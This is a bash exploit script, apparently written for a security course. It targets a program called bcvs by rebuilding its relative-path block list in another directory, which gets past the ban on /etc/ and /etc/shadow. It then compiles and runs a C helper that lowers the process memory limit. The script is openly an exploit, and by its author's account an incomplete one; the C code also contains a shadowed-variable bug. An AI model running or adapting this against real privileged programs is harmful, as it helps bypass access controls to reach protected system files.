#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
#
# Right now I am working on exploiting the strcpy/strcat
# overflow in the copyFile function.
## ----------------------------------------------------- ##

# Setup necessary environment
REPODIR=".bcvs"
BLOCKLIST="block.list"
BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"

mkdir -p sploit1_dir
cd sploit1_dir
mkdir -p .bcvs
touch .bcvs/block.list

#blocklist - Exact copy of the one in bcvs's directory
echo $REPODIR > $BLOCKLISTPATH
echo "/etc/" >> $BLOCKLISTPATH
echo "/etc/shadow" >> $BLOCKLISTPATH
echo "/sbin/" >> $BLOCKLISTPATH

cat <<EOS > "exploit.c"
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/resource.h>

#define START_LIMIT 10
#define END_LIMIT_DELTA 2000

typedef enum {false, true} bool;

void checkStatus(int status, bool fatal) {
  if (status < 0) {
    perror("Error");
    if (fatal) {
      exit(status);
    }
  }
}

int main(int argc, char* argv[]) {
  struct rlimit limit;
  int as_limit_end, as_limit = START_LIMIT;
  int status;

  if (argc > 1) {
    as_limit = atoi(argv[1]);
  }

  if (argc > 2) {
    as_limit_end = as_limit + atoi(argv[2]);
  } else {
    int as_limit_end = as_limit + END_LIMIT_DELTA;
  }

  status = getrlimit(RLIMIT_AS, &limit);
  checkStatus(status, true);
  printf("RLIMIT_AS (soft: %d, hard: %d)\n", (int) limit.rlim_cur, (int) limit.rlim_max);

  printf("Setting RLIMIT_AS to (%d, %d)\n", as_limit, as_limit);
  limit.rlim_cur = as_limit;
  limit.rlim_max = as_limit;

  status = setrlimit(RLIMIT_AS, &limit);
  checkStatus(status, true);
  printf("RLIMIT_AS (soft: %d, hard: %d)\n", (int) limit.rlim_cur, (int) limit.rlim_max);

  return 0;
}
EOS
gcc -o exploit exploit.c

./exploit
